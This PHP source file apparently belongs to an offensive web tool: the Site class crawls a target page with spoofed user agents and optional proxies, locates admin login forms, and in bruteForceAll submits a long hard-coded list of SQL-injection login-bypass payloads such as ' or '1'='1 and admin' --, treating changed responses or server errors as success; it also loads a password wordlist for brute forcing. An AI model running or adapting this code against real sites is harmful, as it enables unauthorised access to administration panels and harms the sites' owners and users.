<?php

namespace Aszone\Site;

use GuzzleHttp\Client;
use GuzzleHttp\Exception;
use Aszone\FakeHeaders\FakeHeaders;
use Respect\Validation\Validator as v;
use Symfony\Component\DomCrawler\Crawler;

class Site{

	public $target;

	public $tor;

	public $proxy;

	public $bodyTarget;

	public $header;

	public function __construct($target,$proxy="")
	{
		$this->header= new FakeHeaders();
		$this->proxy	= $proxy;
		$this->target	= $target;
		try{
			$client 		 = new Client();
			$this->bodyTarget= $client->get(
				$this->target,
				[
					"proxy"=> $this->proxy,
					'headers' => ['User-Agent' => $this->header->getUserAgent()],
					'timeout' => 30,
				])->getBody()->getContents();
		}catch(\Exception $e){
			echo $e->getCode()." - page not Found;";
		}
	}

	public function isAdmin($body=false)
	{
		$isUrl   	= v::url()->notEmpty()->validate($this->target);
		if($isUrl)
		{
			if(!$body)
			{
				$existInputPassword = $this->checkInputPassword($this->bodyTarget);
				$existInputUsername = $this->checkInputUsername($this->bodyTarget);
			}
			else
			{
				$existInputPassword = $this->checkInputPassword($body);
				$existInputUsername = $this->checkInputUsername($body);
			}

			if($existInputPassword AND $existInputUsername AND $existInputPassword['actionParentForm']==$existInputUsername['actionParentForm']){
				return true;
			}
		}
		return false;
	}

	/*public function setProxySiteList()
	{
		$proxySiteList=new ProxySiteList();
		$proxy=$proxySiteList->getProxyOfSites();
		var_dump($proxy);
		exit();
	}*/

	public function getNameFieldUsername()
	{
		$resultNameField=false;
		$crawler 	= new Crawler($this->bodyTarget);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField) {
			if($node->attr('name'))
			{
				$validNameField =  $this->verifyListNamesUsername($node->attr('name'));
				$field[$node->attr('name')]=$node->attr('value');
			}
			if(isset($validNameField) AND !empty($validNameField))
			{
				$resultNameField=$field;
			}
		});
		return $resultNameField;
	}
	public function getNameFieldPassword()
	{
		$resultNameField=false;
		$crawler 	= new Crawler($this->bodyTarget);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField) {
			if($node->attr('name'))
			{
				$validNameField =  $this->verifyListNamesPassword($node->attr('type'));
				$field[$node->attr('name')]=$node->attr('value');
			}

			if(isset($validNameField) AND !empty($validNameField))
			{
				$resultNameField=$field;
			}
		});
		return $resultNameField;
	}

	public function getActionForm()
	{
		$result="";
		$crawler 	= new Crawler($this->bodyTarget);

		$action = $crawler->filter('form')->each(function (Crawler $node, $i) use(&$result)
		{
			if($this->isAdmin($node->parents('form')->html()))
			{
				$result= $this->sanitazeActionForm($node->attr('action'));
			}
		});

		return $result;
	}

	public function bruteForceAll($action,$method,$username,$password,$otherFields=array())
	{
		//$proxySiteList=new ProxySiteList();
		//echo "\n".$username." -> ".$password;
		$listForInjection=$this->listOfInjectionAdmin();
		$pageControl="";
		$sqlInjection=false;
		$count0=0;
		foreach($listForInjection as $keyInjetion=> $injetion)
		{
			echo ".";
			$username[key($username)]=$injetion;
			$password[key($password)]=$injetion;
			array(
				'body' => array(
					$username,
					$password,
				)
			);

			if( is_null($otherFields))
			{
				$fields=array_merge($username,$password);
			}
			else
			{
				$fields=array_merge($username,$password,$otherFields);
			}

			$dataToPost=['body'=>$fields];
			$client 	= new Client(['defaults' => [
				'headers' => ['User-Agent' => $this->header->getUserAgent()],
				'proxy'   => $this->proxy,
				'timeout' => 30
				]
			]);
			if(strcasecmp($method,'post')==0){

				try{
					$body = $client->post($action,$dataToPost)->getBody()->getContents();

				}catch(\Exception $e){
					//var_dump($e);
					if($e->getCode()=="500"){
						$sqlInjection=true;
						$obs="is probably sql injection";
						$body=false;
					}
					if($e->getCode()=="0")
					{
						$count0++;
						if($count0==3)
						{
							$obs ="is probably break system with force manny requisitions";
						}
						$sqlInjection=true;
					}
					echo $e->getCode()." - page not Found;";

					if($e->getCode()=="404"){
						//echo $e->getCode()." - page not Found;";
						break;
					}

				}

			}else{
				try{
					$body = $client->get($action,array(),$dataToPost)->getBody()->getContents();
				}catch(\Exception $e){
					if($e->getCode()=="404"){
						echo $e->getCode()." - page not Found;";
						break;
					}
				}
			}
			if($keyInjetion==0)
			{
				$pageControl=$body;
			}

			if((isset($body) AND $pageControl!=$body) OR $sqlInjection)
			{
				echo "\n...sussefull...\n";
				$resultData['username']=$injetion;
				$resultData['password']=$injetion;
				if($sqlInjection){
					$resultData['obs']=$obs;
				}
				$sqlInjection=false;
				$count0=0;
				echo "\n";
				return $resultData;
			}
			//sleep(1);
		}

		return;
	}

	public function listOfInjectionAdmin()
	{
		$injection[]="zzaa44";
		$injection[]="admin";
		$injection[]="adm";
		$injection[]="' or '1'='1";
		$injection[]="\' or \'1\'=\'1";
		$injection[]="' or 'x'='x";
		$injection[]="\' or \'x\'=\'x";
		$injection[]="' or 0=0 --";
		$injection[]="\' or 0=0 --";
		$injection[]='" or 0=0 --';
		$injection[]='\" or 0=0 --';
		$injection[]="or 0=0 --";
		$injection[]='" or 0=0 #';
		$injection[]='\" or 0=0 #';
		$injection[]="or 0=0 #";
		$injection[]="' or 'x'='x";
		$injection[]="\' or \'x\'=\'x";
		$injection[]='" or "x"="x';
		$injection[]='\" or \"x\"=\"x';
		$injection[]='" or 1=1--';
		$injection[]='\" or 1=1--';
		$injection[]='" or "a"="a';
		$injection[]='\" or \"a\"=\"a';
		$injection[]='") or ("a"="a';
		$injection[]='\") or (\"a\"=\"a';
		$injection[]='and 1=1';
		$injection[]="') or ('x'='x";
		$injection[]="\') or (\'x'=\'x";
		$injection[]="' or 1=1--";
		$injection[]="\' or 1=1--";
		$injection[]="or 1=1--";
		$injection[]="' or a=a--";
		$injection[]="\' or a=a--";
		$injection[]="') or ('a'='a";
		$injection[]="\') or (\'a\'='a";
		$injection[]="hi' or 1=1 --";
		$injection[]="hi\' or 1=1 --";
		$injection[]="'or'1=1'";
		$injection[]="\'or\'1=1\'";
		$injection[]="==";
		$injection[]="and 1=1--";
		$injection[]="' or 'one'='one--";
		$injection[]="\' or \'one\'=\'one--";
		$injection[]='hi" or "a"="a';
		$injection[]='hi\" or \"a\"=\"a';
		$injection[]='hi" or 1=1 --';
		$injection[]='hi\" or 1=1 --';
		$injection[]='" or 0=0 --';
		$injection[]='\" or 0=0 --';
		$injection[]='" or 0=0 #';
		$injection[]='\" or 0=0 #';
		$injection[]='" or "x"="x';
		$injection[]='\" or \"x\"=\"x';
		$injection[]='" or 1=1--';
		$injection[]='\" or 1=1--';
		$injection[]="' or 'one'='one";
		$injection[]="\' or \'one\'=\'one";
		$injection[]="' and 'one'='one";
		$injection[]="\' and \'one\'=\'one";
		$injection[]="' and 'one'='one--";
		$injection[]="\' and \'one\'=\'one--";
		$injection[]="1') and '1'='1--";
		$injection[]="1\') and \'1\'=\'1--";
		$injection[]=") or ('1'='1--";
		$injection[]=") or (\'1\'=\'1--";
		$injection[]=") or '1'='1--";
		$injection[]=") or \'1\'=\'1--";
		$injection[]="or 1=1/*";
		$injection[]="or 1=1#";
		$injection[]="or 1=1--";
		$injection[]="admin'/*";
		$injection[]="admin\'/*";
		$injection[]="admin' #";
		$injection[]="admin\' #";
		$injection[]="admin' --";
		$injection[]="admin\' --";
		$injection[]="') or ('a'='a";
		$injection[]="\') or (\'a\'=\'a";
		$injection[]="' or a=a--";
		$injection[]="\' or a=a--";
		$injection[]="or 1=1--";
		$injection[]="' or 1=1--";
		$injection[]="\' or 1=1--";
		$injection[]="') or ('x'='x";
		$injection[]="\') or (\'x'=\'x";
		$injection[]="' or 'x'='x";
		$injection[]="\' or \'x\'=\'x";
		$injection[]="or 0=0 #";
		$injection[]="' or 0=0 #";
		$injection[]="\' or 0=0 #";
		$injection[]="or 0=0 --";
		$injection[]="' or 0=0 --";
		$injection[]="\' or 0=0 --";
		$injection[]="' or 'x'='x";
		$injection[]="\' or \'x\'=\'x";
		$injection[]="' or '1'='1";
		$injection[]="\' or \'1\'=\'1";
		$injection[]='" or "a"="a';
		$injection[]='\" or \"a\"=\"a';
		$injection[]='") or ("a"="a';
		$injection[]='\") or (\"a\"=\"a';
		$injection[]='hi" or "a"="a';
		$injection[]='hi\" or \"a\"=\"a';
		$injection[]='hi" or 1=1 --';
		$injection[]='hi\" or 1=1 --';
		$injection[]="hi' or 1=1 --";
		$injection[]="hi\' or 1=1 --";
		$injection[]="'or'1=1'";
		$injection[]="\'or\'1=1\'";

		return $injection;
	}


	private function sanitazeActionForm($action)
	{
		$explodeUrl=explode("/",$this->target);
		array_pop($explodeUrl);
		$implodeUrl=implode("/",$explodeUrl);
		return $implodeUrl."/".$action;
	}

	public function getMethodForm()
	{
		$crawler 	= new Crawler($this->bodyTarget);
		return $crawler->filter('form')->attr("method");
	}

	public function getOthersField($excludes)
	{

		$crawler 	= new Crawler($this->bodyTarget);

		$dataFields=array();

		//$inputs2 = $crawler->filter('form')->selectButton('input[type=submit]')->form();
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$dataFields,&$excludes) {
			$keyResult=$node->parents()->filter('form')->attr('action');
			if((!$excludes OR ($key = array_key_exists($node->attr('name'), $excludes)) === false))
			{
				$dataFields[$this->sanitazeActionForm($keyResult)][$node->attr('name')]= $node->attr('value');
			}
		});

		return $dataFields;
	}

	private function checkInputPassword($body)
	{
		$checkPassword = false;
		$crawler 	= new Crawler($body);

		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkPassword) {
				if($node->attr('name'))
				{
					$actionForm=$node->parents()->filter('form')->attr('action');
					$validPassword =  $this->verifyListNamesPassword($node->attr('name'));
				}
				if(!$node->attr('name') AND $node->attr('id'))
				{
					$actionForm=$node->parents()->filter('form')->attr('action');
					$validPassword = $this->verifyListNamesPassword($node->attr('id'));
				}
				if(isset($validPassword) AND !empty($validPassword))
				{
					$checkPassword['name']=$validPassword;
					$checkPassword['actionParentForm']=$actionForm;
				}
		});
		return $checkPassword;

	}

	private function verifyListNamesPassword($name)
	{
		$isValid=preg_match("/(.?)pass|password|senha(.?)/i",$name,$m);
		if($isValid)
		{
			return $isValid;
		}
		return false;
	}

	private function checkInputUsername($body)
	{
		$checkUsername=false;
		$crawler 	= new Crawler($body);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkUsername) {
			if($node->attr('name'))
			{
				$actionForm=$node->parents()->filter('form')->attr('action');
				$validUsername =  $this->verifyListNamesUsername($node->attr('name'));
			}
			if(!$node->attr('name') AND $node->attr('id'))
			{
				$actionForm=$node->parents()->filter('form')->attr('action');
				$validUsername = $this->verifyListNamesUsername($node->attr('id'));
			}
			if(isset($validUsername) AND !empty($validUsername))
			{
				$checkUsername['name']=$validUsername;
				$checkUsername['actionParentForm']=$actionForm;
			}
		});
		return $checkUsername;

	}

	private function verifyListNamesUsername($name)
	{
		$isValid=preg_match("/(.?)user|username|login|cpf|email|mail|usuario(.?)/i",$name,$m);
		if($isValid)
		{
			return $isValid;
		}
		return false;
	}

	public function getWordListInArray($wordlist=""){

		if(empty($wordlist)){
			/*$zip = new \ZipArchive;
			$zip->open('resource/wordlist.zip');
			$zip->extractTo('resource/tmp/');
			$zip->close();*/
			$wordlist    = __DIR__.'/../resource/litleWordListPt.txt';
			$arrWordlist = file($wordlist,FILE_IGNORE_NEW_LINES);
			//unlink($wordlist);
			return $arrWordlist;
		}

		$checkFileWordList  = v::file()->notEmpty()->validate($wordlist);
		if($checkFileWordList){
			$targetResult   = file($wordlist,FILE_IGNORE_NEW_LINES);
			return $targetResult;
		}

		return false;

	}

	public function getBaseUrByUrl()
	{
		$validXmlrpc = preg_match("/^.+?[^\/:](?=[?\/]|$)/",$this->target,$m,PREG_OFFSET_CAPTURE);

		if ($validXmlrpc) {

			return $m[0][0];

		}
		return;
	}
}